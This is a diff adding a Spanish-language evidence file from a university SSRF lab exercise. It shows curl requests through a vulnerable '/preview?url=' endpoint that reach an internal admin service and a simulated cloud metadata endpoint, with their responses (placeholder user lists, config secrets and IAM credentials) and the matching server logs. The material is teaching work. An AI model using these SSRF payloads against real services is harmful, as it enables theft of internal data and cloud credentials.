@@ -1,0 +1,32 @@
+EVIDENCIA — Laboratorio ABET SSRF — Grupo 4 — Persona 3
+Reproducción validada contra el código real de lab-environment/ (ver nota de metodología en la guía).
+
+$ curl -s http://127.0.0.1:5000/health
+{"status":"ok"}
+
+$ curl -s "http://127.0.0.1:5000/preview?url=http://127.0.0.1:5001/admin/users"
+{"users":[{"id":1,"role":"superadmin","user":"admin"},{"id":2,"role":"finance","user":"maria.lopez"},{"id":3,"role":"support","user":"jperez"}]}
+
+$ curl -s "http://127.0.0.1:5000/preview?url=http://127.0.0.1:5001/admin/config"
+{"api_key":"FAKE-INTERNAL-API-KEY","db_host":"db.internal.lab","db_password":"FAKE-PASSWORD-123"}
+
+$ curl -s "http://127.0.0.1:5000/preview?url=http://127.0.0.1:8090/latest/meta-data/iam/security-credentials/"
+lab-ec2-role
+
+$ curl -s "http://127.0.0.1:5000/preview?url=http://127.0.0.1:8090/latest/meta-data/iam/security-credentials/lab-ec2-role"
+{"AccessKeyId":"AKIAFAKEFAKEFAKEFAKE","Code":"Success","Expiration":"2099-12-31T23:59:59Z","SecretAccessKey":"FAKE/secret/access/key/for/lab/only","Token":"FAKE-SESSION-TOKEN-LAB-ONLY","Type":"AWS-HMAC"}
+
+--- Log del lado servidor: internal-admin-service ---
+2026-11-26 [internal-admin] GET /admin/users desde 127.0.0.1
+2026-11-26 [internal-admin] 127.0.0.1 - - "GET /admin/users HTTP/1.1" 200 -
+2026-11-26 [internal-admin] GET /admin/config desde 127.0.0.1
+2026-11-26 [internal-admin] 127.0.0.1 - - "GET /admin/config HTTP/1.1" 200 -
+
+--- Log del lado servidor: fake-metadata ---
+2026-11-26 [fake-metadata] GET /latest/meta-data/iam/security-credentials/ desde 127.0.0.1
+2026-11-26 [fake-metadata] GET /latest/meta-data/iam/security-credentials/lab-ec2-role desde 127.0.0.1
+
+NOTA: en docker compose real, "desde 127.0.0.1" será "desde 172.28.0.10" (IP de frontend-service
+dentro de internal-net) — reemplaza esta evidencia por tus propias capturas corriendo
+"docker compose up --build" y el script exploit-ssrf.sh con los valores por defecto
+(BASE_URL=http://localhost:8080, ADMIN_HOST=internal-admin-service:5001, METADATA_HOST=fake-metadata).
